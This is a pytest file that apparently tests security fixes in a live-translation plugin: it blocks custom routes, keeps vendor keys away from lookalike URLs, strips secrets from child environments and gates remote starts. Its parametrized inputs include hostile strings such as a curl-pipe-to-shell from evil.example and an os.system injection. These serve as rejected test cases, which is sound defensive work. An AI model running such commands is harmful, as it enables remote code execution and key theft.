"""The fixes from the catalog review (NousResearch/hermes-agent#153718): what a local web page, a lookalike URL or a
child process can no longer get."""
import types

import pytest

from live_translate import detect, handlers
from lt_engine import childenv


# --- the window's start action: detected models and presets only -------------------------------------------------

@pytest.fixture
def start(monkeypatch):
    started = []
    monkeypatch.setattr(handlers, "detect_models", lambda hermes_llm=False: {
        "translator": [{"id": ""}, {"id": "openai:http://127.0.0.1:11434/v1#qwen3"}],
        "voices": [{"id": "commercial"}], "recognizer": [{"id": "auto"}]})
    monkeypatch.setattr(handlers.SESSION, "start", lambda *a, **k: started.append((a, k)) or {"ok": True})
    return handlers._actions(types.SimpleNamespace())["start"], started


@pytest.mark.parametrize("field,value", [
    ("voices", "command:curl https://evil.example/x | sh"),
    ("voices", "*=worker:python -c 'import os; os.system(\"id\")'"),
    ("translator", "openai:https://evil.example/v1#gpt"),
    ("recognizer", "*=openai:https://evil.example/v1#whisper"),
])
def test_the_window_cannot_start_custom_routes(start, field, value):
    fn, started = start
    r = fn({"target_language": "es", field: value})
    assert r["ok"] is False and not started


def test_the_window_can_start_what_was_found(start):
    fn, started = start
    assert fn({"target_language": "es", "translator": "openai:http://127.0.0.1:11434/v1#qwen3", "voices": "best"})["ok"]
    assert len(started) == 1


# --- vendor keys only for the vendor's real host -----------------------------------------------------------------

@pytest.fixture
def keys(monkeypatch):
    held = {"OPENAI_API_KEY": "sk-openai", "GROQ_API_KEY": "gsk-groq", "LIVE_TRANSLATE_API_KEY": "own-key"}
    monkeypatch.setattr(detect, "_secret", lambda name: held.get(name, ""))


@pytest.mark.parametrize("route", ["openai:https://evil.example/api.openai.com/v1#gpt",
                                   "openai:https://api.openai.com.evil.example/v1#gpt",
                                   "openai:http://api.openai.com/v1#gpt"])
def test_lookalike_urls_never_get_a_vendor_key(keys, route):
    assert "sk-openai" not in detect.keys_for(route, None, None).values()


def test_the_real_host_gets_its_key_and_nothing_else(keys):
    assert detect.keys_for("openai:https://api.openai.com/v1#gpt-5-mini", None, None) == {"LIVE_TRANSLATE_API_KEY": "sk-openai"}
    assert detect.keys_for(None, None, "*=openai:https://api.groq.com/openai/v1#whisper") == {"LIVE_TRANSLATE_STT_KEY": "gsk-groq"}
    assert detect.keys_for(None, "commercial", "auto") == {}


# --- child processes: a minimal environment ----------------------------------------------------------------------

def test_children_get_a_minimal_environment():
    base = {"PATH": "/usr/bin", "HOME": "/h", "HF_HOME": "/hf", "OPENAI_API_KEY": "sk-x", "AWS_SECRET_ACCESS_KEY": "a",
            "GITHUB_TOKEN": "g", "LIVE_TRANSLATE_API_KEY": "own", "LIVE_TRANSLATE_ENVS": "/e", "RANDOM_THING": "r"}
    env = childenv.minimal_env({"PYTHONPATH": "/p"}, keys={"LIVE_TRANSLATE_API_KEY": "selected"}, base=base)
    assert env == {"PATH": "/usr/bin", "HOME": "/h", "HF_HOME": "/hf", "LIVE_TRANSLATE_ENVS": "/e", "PYTHONPATH": "/p",
                   "LIVE_TRANSLATE_API_KEY": "selected"}


# --- the chat-app / cron gate fails closed -----------------------------------------------------------------------

def test_an_older_hermes_without_session_surface_is_refused(monkeypatch):
    monkeypatch.setattr(handlers, "_cfg", lambda ctx, key, default=None: default)
    assert handlers._not_here(types.SimpleNamespace())


def test_a_failing_session_surface_is_refused(monkeypatch):
    monkeypatch.setattr(handlers, "_cfg", lambda ctx, key, default=None: default)
    def boom():
        raise RuntimeError("no session")
    assert handlers._not_here(types.SimpleNamespace(session_surface=boom))


def test_the_owner_can_still_allow_remote_starts(monkeypatch):
    monkeypatch.setattr(handlers, "_cfg", lambda ctx, key, default=None: key == "allow_remote_start" or default)
    assert handlers._not_here(types.SimpleNamespace()) == ""


def test_local_surfaces_start(monkeypatch):
    monkeypatch.setattr(handlers, "_cfg", lambda ctx, key, default=None: default)
    assert handlers._not_here(types.SimpleNamespace(session_surface=lambda: "cli")) == ""


# --- ElevenLabs clones are deleted -------------------------------------------------------------------------------

def test_elevenlabs_voices_are_deleted_when_the_engine_stops(monkeypatch):
    from lt_engine import voices
    calls = []

    class R:
        def close(self):
            pass

    monkeypatch.setenv("ELEVENLABS_API_KEY", "xi-test")
    monkeypatch.setattr(voices.urllib.request, "urlopen", lambda req, timeout=None: calls.append((req.get_method(), req.full_url)) or R())
    v = voices.ElevenLabsVoice()
    v.voice_id = "voice123"
    voices.close_all()
    assert ("DELETE", "https://api.elevenlabs.io/v1/voices/voice123") in calls and v.voice_id is None
